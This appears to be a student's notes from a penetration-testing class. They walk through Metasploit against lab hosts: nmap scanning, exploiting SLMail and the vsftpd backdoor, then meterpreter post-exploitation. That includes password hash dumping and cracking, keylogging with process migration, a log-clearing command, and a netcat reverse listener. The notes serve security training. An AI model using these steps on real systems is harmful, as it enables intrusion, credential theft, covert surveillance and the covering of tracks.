update-rc.d postgresql enable # run postgres during startup
service --status-all | grep postgres
service postgresql start # immediately start postgresdb

msfdb init

msfconsole
    help
    db_status
    
    workspace
    workspace -h
    
    workspace -a inclass #show a workspace
    workspace #show workspaces / current workspace
    
    # populate db
    db_nmap -n -v -sn 192.168.56.101-200
    
    # list hosts recorded within db by the nmap command
    hosts
    # should be empty atm...
    creds    
    # also empty...
    vulns    
    # empty...
    services
    
    db_nmap -n -v -O 192.168.56.101-181

    # now this has os information from nmap
    host    
    # now services has information!
    services
    # services help menu
    services -h
    # list services of x.x.x.181 machine
    services -S 181
    
    # -sV grabs banners
    db_nmap -n -v -sV --top-ports 1400 -T4 192.168.56.101-181
    
    # now a bunch of service versions listed
    services
    
    # show things built into kali
    show (-h)
    
    # scanners/fuzzers/post exploits...
    show auxiliary
    
    # search for scanners / fuzzers
    search -type:auxiliary scanner
    search -type:auxiliary fuzzer
    
    # shows an slmail exploit
    search slmail
    
    use exploit/windows/pop3/seattlelab_pass
        # show info about this exploit
        info
        
        # available command line parameters
        options
        
        # find the host to exploit
        hosts
        
        # set parameter/option
        set RHOST 192.168.56.181
        
        # set global parameter
        # will be set across all modules/exploits
        setg RHOST ...
        
        # exploit
        # we are now in another console
        run
            # 
            help
            
            # executed on other system
            ls
            ipconfig
            arp # list mac/ip mappings
            netstat # open ports / listeners (also internals)
            #clearev # CLEANUP MY MALICIOUS ACTIVITY
            getuid
            shell # enter windows command prompt
                exit
            
            ps # active processes
            
            # try to brute force admin access
            #getsystem
            
            screenshot # desktop screenshot
            
            hashdump # list users / hashed passwords
            
            # background the meterpreter console
            background
        
        creds
        
        use post/windows/gather/hashdump
        
        # list meterpreter sessions
        sessions
        
        options
        
        set SESSION 1
        
        # reenter/reengage meterpreter
        run
        
        #         
        creds
        
        # jack the ripper
        use auxiliary/analyze/jtr_crack_fast
        
        run
            # jtr found a password maybe?
            
        vulns
        
        # reenter meterpreter
        sessions -i 1
            # start keylogger
            keyscan_start
            
            # show keylogging for exploited process
            keyscan_dump
            
            # find IE process to attach
            # note the PID (first number)
            ps
            
            migrate 2476
            
            getuid
            
            # now logs should work
            keyscan_start            
            keyscan_dump
            keyscan_stop
            
            # fails because we migrated down
            migrate 3860
            
            
            
            # better migration method...
            background
           
        sessions
           
        run # just run it again
        
        # now 2 sessions are listed!
        sessions
        
        # kill session 3
        sessions -k 3
        
        services
        
        
        
        search vsftp
        use exploit/unix/ftp/vsftpd
        
        set RHOST 192.168.56.101
        
        # run the backdoor
        run 
            whoami
            ipconfig
            ls
            
            exit
        
        
        
not eternal blue
not bluekeep
not rpc
not smp
not apache

elasticsearch
port 9200
nmap scan targeted enumeration


nmap -v -p 9200 -A 192.168.56.181 --min-rate 10000

stabilizing meterpreter shells
use lasagna to dump hashes

just login into mysql directly
mysql a

basic reverse listener
nc -nlvp <port>